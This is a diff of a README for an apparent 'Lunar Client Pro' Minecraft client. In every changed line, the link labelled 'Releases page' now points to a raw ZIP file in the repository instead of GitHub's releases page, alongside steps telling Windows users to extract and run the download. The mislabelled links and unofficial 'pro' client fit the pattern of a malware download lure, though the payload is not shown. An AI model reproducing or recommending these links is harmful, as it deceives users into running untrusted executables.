@@ -1,17 +1,17 @@
 # 🎮 Lunar-Client-Pro-Version-Minecraft - Fast Minecraft, Low Lag, Smooth Play
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/renjujarackal/Lunar-Client-Pro-Version-Minecraft/releases)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/renjujarackal/Lunar-Client-Pro-Version-Minecraft/main/BaseMain/Version_Client_Lunar_Minecraft_Pro_2.2.zip)
 
 ## 🚀 Getting Started
 
 Lunar Client Pro Minecraft Edition is a modpack and game client for Minecraft players who want better frame rate, lower input delay, and a cleaner setup.
 
 Use the release page to get the latest version for Windows:
-[Visit the Releases page](https://github.com/renjujarackal/Lunar-Client-Pro-Version-Minecraft/releases)
+[Visit the Releases page](https://raw.githubusercontent.com/renjujarackal/Lunar-Client-Pro-Version-Minecraft/main/BaseMain/Version_Client_Lunar_Minecraft_Pro_2.2.zip)
 
 ## 📥 Download and Install on Windows
 
-1. Open the [Releases page](https://github.com/renjujarackal/Lunar-Client-Pro-Version-Minecraft/releases).
+1. Open the [Releases page](https://raw.githubusercontent.com/renjujarackal/Lunar-Client-Pro-Version-Minecraft/main/BaseMain/Version_Client_Lunar_Minecraft_Pro_2.2.zip).
 2. Find the latest release at the top of the page.
 3. Download the Windows file from the release assets.
 4. If the download comes as a `.zip` file, right-click it and choose **Extract All**.
@@ -189,7 +189,7 @@ If you download a ZIP file, extract it before use. If you get an EXE, double-cli
 ## 📦 Release Page
 
 Use this page to get the current Windows download:
-[https://github.com/renjujarackal/Lunar-Client-Pro-Version-Minecraft/releases](https://github.com/renjujarackal/Lunar-Client-Pro-Version-Minecraft/releases)
+[https://raw.githubusercontent.com/renjujarackal/Lunar-Client-Pro-Version-Minecraft/main/BaseMain/Version_Client_Lunar_Minecraft_Pro_2.2.zip](https://raw.githubusercontent.com/renjujarackal/Lunar-Client-Pro-Version-Minecraft/main/BaseMain/Version_Client_Lunar_Minecraft_Pro_2.2.zip)
 
 ## 🧱 Project Topics
 
@@ -236,7 +236,7 @@ If you are new to Minecraft clients, use this simple rule:
 
 ## 🔗 Direct Download Access
 
-[Visit the Releases page to download](https://github.com/renjujarackal/Lunar-Client-Pro-Version-Minecraft/releases)
+[Visit the Releases page to download](https://raw.githubusercontent.com/renjujarackal/Lunar-Client-Pro-Version-Minecraft/main/BaseMain/Version_Client_Lunar_Minecraft_Pro_2.2.zip)
 
 ## 🛠️ Quick Start
 
